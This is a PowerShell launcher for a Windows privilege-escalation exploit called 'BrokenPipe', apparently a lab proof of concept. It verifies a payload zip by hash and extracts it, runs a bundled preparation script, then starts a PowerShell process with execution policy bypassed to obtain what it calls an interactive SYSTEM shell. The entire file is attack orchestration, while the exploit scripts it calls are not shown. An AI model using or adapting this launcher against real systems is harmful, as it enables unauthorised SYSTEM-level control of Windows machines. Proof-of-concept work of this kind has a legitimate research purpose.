[CmdletBinding()]
param(
    [Parameter(Mandatory)]
    [string]$PayloadZip,

    [Parameter(Mandatory)]
    [string]$ExtractRoot
)

$ErrorActionPreference = 'Stop'
Set-StrictMode -Version Latest

$expectedPayloadSha256 = '1229A01115E66DB56749C0326744CAF32F0E78A67E8B76311361603AE1D75E34'
$runtimeRoot = 'C:\Users\Public\BrokenPipe'

Import-Module Microsoft.PowerShell.Utility -ErrorAction Stop

function Quote-BrokenPipeArgument {
    param([Parameter(Mandatory)][string]$Value)
    '"' + $Value.Replace('"', '\"') + '"'
}

try {
    $payloadHash = (Get-FileHash -LiteralPath $PayloadZip -Algorithm SHA256).Hash.ToUpperInvariant()
    if ($payloadHash -cne $expectedPayloadSha256) {
        throw 'Embedded payload SHA-256 mismatch.'
    }

    Expand-Archive -LiteralPath $PayloadZip -DestinationPath $ExtractRoot
    $packageRoots = @(Get-ChildItem -LiteralPath $ExtractRoot -Directory | Where-Object {
        Test-Path -LiteralPath (Join-Path $_.FullName 'PACKAGE-MANIFEST.json') -PathType Leaf
    })
    if ($packageRoots.Count -ne 1) {
        throw 'Embedded package layout is invalid.'
    }

    $packageRoot = $packageRoots[0].FullName
    $prepareScript = Join-Path $packageRoot 'Prepare-Interactive-Lab.ps1'
    $runScript = Join-Path $packageRoot 'Run-Interactive-Lab.ps1'

    Write-Host '[*] Preparing...'
    $prepareOutput = @(& $prepareScript -RuntimeRoot $runtimeRoot 6>&1)
    $runMatch = [regex]::Match(
        ($prepareOutput -join "`n"),
        '(?m)^BROKENPIPE_RUN_ID=([a-z0-9][a-z0-9-]{2,63})\s*$'
    )
    if (-not $runMatch.Success) {
        throw 'Preparation passed no valid internal run identifier to the launcher.'
    }
    $runId = $runMatch.Groups[1].Value

    Write-Host '[*] Launching SYSTEM shell...'

    $powerShell = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
    $arguments = @(
        '-NoProfile',
        '-ExecutionPolicy', 'Bypass',
        '-File', (Quote-BrokenPipeArgument $runScript),
        '-RunId', (Quote-BrokenPipeArgument $runId),
        '-RuntimeRoot', (Quote-BrokenPipeArgument $runtimeRoot)
    ) -join ' '

    $startInfo = [Diagnostics.ProcessStartInfo]::new()
    $startInfo.FileName = $powerShell
    $startInfo.Arguments = $arguments
    $startInfo.UseShellExecute = $false
    $startInfo.RedirectStandardInput = $true
    $startInfo.RedirectStandardOutput = $true
    $startInfo.RedirectStandardError = $true
    $process = [Diagnostics.Process]::Start($startInfo)
    if ($null -eq $process) { throw 'Could not start the proof controller.' }
    $stdout = $process.StandardOutput.ReadToEndAsync()
    $stderr = $process.StandardError.ReadToEndAsync()
    $process.StandardInput.WriteLine('INTERACTIVE SYSTEM CMD')
    $process.StandardInput.Close()
    $process.WaitForExit()
    [Threading.Tasks.Task]::WaitAll(@($stdout, $stderr))
    if ($process.ExitCode -ne 0) {
        throw "Exploit failed with exit code $($process.ExitCode)."
    }

    Write-Host '[+] Complete.'
    exit 0
} catch {
    Write-Host ('[-] ' + $_.Exception.Message) -ForegroundColor Red
    exit 1
}
